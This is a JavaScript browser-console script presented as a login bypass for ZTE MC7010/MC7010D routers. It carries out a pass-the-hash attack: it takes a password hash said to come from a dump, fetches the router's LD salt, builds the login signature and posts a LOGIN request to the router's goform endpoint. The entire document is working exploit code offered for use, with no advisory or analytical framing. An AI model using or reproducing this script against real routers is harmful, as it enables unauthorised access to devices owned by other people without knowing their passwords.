// ==========================================
// ZTE MC7010 / MC7010D LOGIN BYPASS
// ==========================================
// This script performs a "Pass-the-Hash" login.
// It requires the username and the SHA256 Hash of the password, not the password itself.

// 1. INPUT CONFIGURATION via Prompts
var myUsername = prompt("Enter Username:", "user");
var storedHash = prompt("Enter the SHA256 Hash of the password (from dump):");

if (!storedHash) {
    console.error("❌ Operation cancelled. Hash is required.");
} else {
    // Ensure the hash is UPPERCASE as expected by ZTE logic
    storedHash = storedHash.trim().toUpperCase();
    
    console.log("🚀 STARTING INTERNAL LOGIN PROCESS...");
    console.log("👤 Username:", myUsername);
    console.log("🔑 Hash:", storedHash);
  
    // Retrieve Salt (LD) and Perform Login
    var ldUrl = "/goform/goform_get_cmd_process?isTest=false&cmd=LD&_=" + new Date().getTime();
    
    $.get(ldUrl, function(response) {
        // Parse JSON if response is a string
        var data = (typeof response === "string") ? JSON.parse(response) : response;
        var salt = data.LD;
        
        if(!salt) { 
            console.error("❌ Error: Missing LD Salt from router response!"); 
            return; 
        }
        
        console.log("1. Salt (LD):", salt);
        console.log("2. Stored Hash:", storedHash);
        
        // CORRECT HASHING LOGIC (As seen in service.js)
        // formula: SHA256( StoredHash + Salt )
        var payload = storedHash + salt;
        var finalSignature = paswordAlgorithmsCookie(payload); // Use the extracted ZTE function
        
        console.log("3. Final Signature:", finalSignature);
        
        // Send Login Request
        $.ajax({
            type: "POST",
            url: "/goform/goform_set_cmd_process",
            data: {
                isTest: "false",
                goformId: "LOGIN",
                username: myUsername,
                password: finalSignature
            },
            success: function(res) {
                console.log("RAW RESULT:", res);
                var resObj = res;
                if (typeof res === "string") {
                    try {
                        resObj = JSON.parse(res);
                    } catch(e) {
                        console.error("Could not parse JSON", e);
                    }
                }
                // Check multiple success indicators
                if(resObj.result == "0" || resObj.result === 0 || resObj.result == "success") {
                    console.log("%c✅ LOGIN SUCCESS!", "color: green; font-size: 20px; font-weight: bold;");
                    console.log("Refreshing page in 3 seconds...");
                    setTimeout(function(){ window.location.reload(); }, 3000);
                } else {
                    console.log("%c❌ LOGIN FAILED.", "color: red; font-size: 16px; font-weight: bold;");
                    console.log("Details:", resObj);
                }
            },
            error: function(err) {
                console.error("❌ AJAX Error:", err);
            }
        });
    });
}
